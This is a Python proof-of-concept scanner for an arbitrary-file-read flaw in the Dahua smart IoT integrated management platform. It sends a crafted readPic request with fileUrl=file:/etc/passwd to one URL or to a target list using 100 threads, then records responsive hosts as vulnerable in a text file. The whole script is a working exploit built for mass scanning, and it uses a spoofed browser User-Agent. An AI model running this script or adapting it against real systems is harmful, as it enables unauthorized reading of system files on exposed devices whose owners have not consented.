import requests
import sys
import argparse
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

def banner():
    test = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|


                            version:1.1.0
                            author:fangwei   
"""
    logging.info(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智能物联综合管理平台 env任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))

def poc(target):
    payload_url = "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd"
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept': '*/*',
        'Connection': 'Keep-Alive',
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }
    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=15, proxies=proxies)

        if res.status_code == 200 and "root" in res.text:
            logging.info(f"{GREEN}[+] 该url存在任意文件读取漏洞: {target}{RESET}")
            with open('dahuare.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
                return True
        else:
            logging.info(f"[-] 该url不存在任意文件读取漏洞: {target}")
    except Exception as e:
        logging.error(f"[*] 该url存在问题: {target}, 错误信息: {e}")
        return False

if __name__ == '__main__':
    main()
